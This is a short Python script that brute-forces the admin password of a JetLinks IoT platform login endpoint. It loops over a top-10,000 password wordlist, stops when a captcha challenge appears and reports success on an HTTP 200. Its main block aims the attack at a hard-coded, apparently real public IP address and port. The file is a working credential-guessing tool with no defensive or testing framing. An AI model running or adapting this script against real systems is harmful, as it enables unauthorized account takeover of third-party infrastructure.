import  HackRequest

class EasyBF(object):

    def __init__(self,ip,pwdlist:str):
        self.hh=HackRequest.hackRequests()
        self.ip=ip
        self.pwdlist=pwdlist


    def hack(self,data,password_keyword):
        url = "http://{}/jetlinks/authorize/login".format(self.ip)
        with open(self.pwdlist, 'r') as f:
            lines = f.readlines()
            for index, line in enumerate(lines):
                password = line.strip('\n')
                data[password_keyword]=password
                try:
                    # resp = requests.post(url, json=json)
                    resp = self.hh.http(url=url, json=data)
                except Exception:
                    print("Error")
                    return False
                if resp.status_code == 404:
                    return False
                if resp.status_code == 400 and '验证码' in resp.text():
                    return False
                if '密码' in resp.text():
                    if index % 100 == 0: print('{} password incorrect,retrying {}'.format(self.ip, index))
                    continue
                if resp.status_code == 200:
                    print(resp.text)
                    return True
                else:
                    print(resp.text)
                    return False

        return False





if __name__ == '__main__':
    ebf=EasyBF('120.55.38.201:9002','../somd5-top1w.txt')
    ebf.hack(data={"username": "admin", "password": "", "expires": 3600000,
                    "tokenType": "default", "verifyKey": "","verifyCode": ""},password_keyword='password')
    pass
